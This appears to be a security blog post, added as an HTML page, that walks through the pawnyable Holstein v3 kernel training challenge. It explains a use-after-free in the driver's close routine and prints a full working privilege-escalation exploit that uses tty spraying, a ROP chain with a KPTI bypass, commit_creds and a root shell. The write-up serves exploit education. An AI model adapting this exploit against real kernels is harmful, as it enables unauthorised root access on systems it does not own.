@@ -1,0 +1,172 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[KERNEL] Heap Use After Free · whrds.log</title><meta name="description" content="※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. This time we run it with Holstein v3. https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/kernel-heap-use-after-free/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/kernel-heap-use-after-free/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/kernel-heap-use-after-free/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[KERNEL] Heap Use After Free · whrds.log"><meta property="og:description" content="※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. This time we run it with Holstein v3. https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g"><meta property="og:url" content="https://whrds.github.io/en/posts/kernel-heap-use-after-free/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[KERNEL] Heap Use After Free","description":"※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. This time we run it with Holstein v3. https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g","datePublished":"2024-11-14","inLanguage":"en","url":"https://whrds.github.io/en/posts/kernel-heap-use-after-free/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/kernel-heap-use-after-free/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[KERNEL] Heap Use After Free</h1><p class="article-description">※ Since the analysis was conducted with reference to the data, there may be errors. ※ If there is anything that needs to be supplemented or corrected, please let us know and we will take action after checking. This time we run it with Holstein v3. https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.g</p><div class="article-meta"><time datetime="2024-11-14">Nov 14, 2024</time><span>·</span><span>2 min read</span></div></header><div class="prose"><p><strong>※ Since the analysis was conducted with reference to the data, there may be errors.</strong> </p>
+<p><strong>※ If there is anything that needs to be supplemented or corrected, please let us know and we will check and take action.</strong></p>
+<p>This time we perform it with Holstein v3.</p>
+<p><a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz">https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-3.tar.gz</a></p>
+<p>In v2, g_buf was allocated using kmalloc().</p>
+<p>Moving to v3, memory leaks were prevented to some extent by performing allocation using kzalloc().</p>
+<pre><code>g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
+if (!g_buf) {
+ printk(KERN_INFO &quot;kmalloc failed&quot;);
+ return -ENOMEM;
+}
+</code></pre>
+<p>When viewed as a function in the user area, kzalloc() initializes to 0 like calloc().</p>
+<p>g_buf is also allocated with kzalloc, and module_read() and module_write() also use the same safe functions as in v2. Where do vulnerabilities occur?</p>
+<p>In v3, a vulnerability occurs in the part where memory is released.</p>
+<pre><code>static int module_close(struct inode *inode, struct file *file)
+{
+ printk(KERN_INFO &quot;module_close called\n&quot;);
+ kfree(g_buf);
+ return 0;
+}
+</code></pre>
+<p>Memory is freed via kfree(), but the pointer to g_buf is not initialized.</p>
+<p>If this happens, g_buf will retain data for the heap area even after it is released.</p>
+<p>Using this, it is possible to perform a UAF attack by reusing the released memory.</p>
+<pre><code>int fd1 = open(&quot;/dev/holstein&quot;, O_RDWR);
+int fd2 = open(&quot;/dev/holstein&quot;, O_RDWR);
+close(fd1);
+write(fd2, &quot;Hello&quot;, 5);
+</code></pre>
+<p>Kernel is written as above, taking advantage of the fact that resources among processes are shared.</p>
+<p>In this case, fd1 is released, but the data is modified by write(), which writes a value to fd2.</p>
+<p>By abusing this, the original function table can be overwritten with a fake func table address, making an exploit possible.</p>
+<pre><code>#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/shm.h&gt;
+#include &lt;sys/timerfd.h&gt;
+#include &lt;unistd.h&gt;
+
+unsigned long kbase, g_buf, current;
+unsigned long user_cs, user_ss, user_rsp, user_rflags;
+
+#define ofs_tty_ops 0xc39c60
+#define rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp (kbase + 0x14fbea)
+#define rop_pop_rdi (kbase + 0x14078a)
+#define rop_pop_rcx (kbase + 0x0eb7e4)
+#define rop_mov_rdi_rax_rep_movsq (kbase + 0x638e9b)
+#define rop_bypass_kpti (kbase + 0x800e26)
+#define addr_commit_creds (kbase + 0x0723c0)
+#define addr_prepare_kernel_cred (kbase + 0x072560)
+
+static void win() {
+  char *argv[] = { &quot;/bin/sh&quot;, NULL };
+  char *envp[] = { NULL };
+  puts(&quot;[+] win!&quot;);
+  execve(&quot;/bin/sh&quot;, argv, envp);
+}
+
+static void save_state() {
+  asm(
+      &quot;movq %%cs, %0\n&quot;
+      &quot;movq %%ss, %1\n&quot;
+      &quot;movq %%rsp, %2\n&quot;
+      &quot;pushfq\n&quot;
+      &quot;popq %3\n&quot;
+      : &quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rsp), &quot;=r&quot;(user_rflags)
+      :
+      : &quot;memory&quot;);
+}
+
+void fatal(const char *msg) {
+  perror(msg);
+  exit(1);
+}
+
+int main() {
+  save_state();
+
+  int fd1 = open(&quot;/dev/holstein&quot;, O_RDWR);
+  int fd2 = open(&quot;/dev/holstein&quot;, O_RDWR);
+  if (fd1 == -1 || fd2 == -1)
+    fatal(&quot;/dev/holstein&quot;);
+  close(fd1);
+
+  int spray[100];
+  for (int i = 0; i &lt; 50; i++) {
+    spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+    if (spray[i] == -1) fatal(&quot;/dev/ptmx&quot;);
+  }
+
+  char buf[0x400];
+  read(fd2, buf, 0x400);
+  kbase = *(unsigned long*)&amp;buf[0x18] - ofs_tty_ops;
+  g_buf = *(unsigned long*)&amp;buf[0x38] - 0x38;
+  printf(&quot;kbase = 0x%016lx\n&quot;, kbase);
+  printf(&quot;g_buf = 0x%016lx\n&quot;, g_buf);
+
+  unsigned long *chain = (unsigned long*)&amp;buf;
+  *chain++ = rop_pop_rdi;
+  *chain++ = 0;
+  *chain++ = addr_prepare_kernel_cred;
+  *chain++ = rop_pop_rcx;
+  *chain++ = 0;
+  *chain++ = rop_mov_rdi_rax_rep_movsq;
+  *chain++ = addr_commit_creds;
+  *chain++ = rop_bypass_kpti;
+  *chain++ = 0xdeadbeef;
+  *chain++ = 0xdeadbeef;
+  *chain++ = (unsigned long)&amp;win;
+  *chain++ = user_cs;
+  *chain++ = user_rflags;
+  *chain++ = user_rsp;
+  *chain++ = user_ss;
+
+  *(unsigned long*)&amp;buf[0x3f8] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;
+
+  write(fd2, buf, 0x400);
+
+  int fd3 = open(&quot;/dev/holstein&quot;, O_RDWR);
+  int fd4 = open(&quot;/dev/holstein&quot;, O_RDWR);
+  if (fd3 == -1 || fd4 == -1)
+    fatal(&quot;/dev/holstein&quot;);
+  close(fd3);
+  for (int i = 50; i &lt; 100; i++) {
+    spray[i] = open(&quot;/dev/ptmx&quot;, O_RDONLY | O_NOCTTY);
+    if (spray[i] == -1) fatal(&quot;/dev/ptmx&quot;);
+  }
+
+  read(fd4, buf, 0x400);
+  *(unsigned long*)&amp;buf[0x18] = g_buf + 0x3f8 - 12*8;
+  write(fd4, buf, 0x20);
+
+  for (int i = 50; i &lt; 100; i++) {
+    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
+  }
+
+  getchar();
+  return 0;
+}
+</code></pre>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/kernel-heap-use-after-free/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
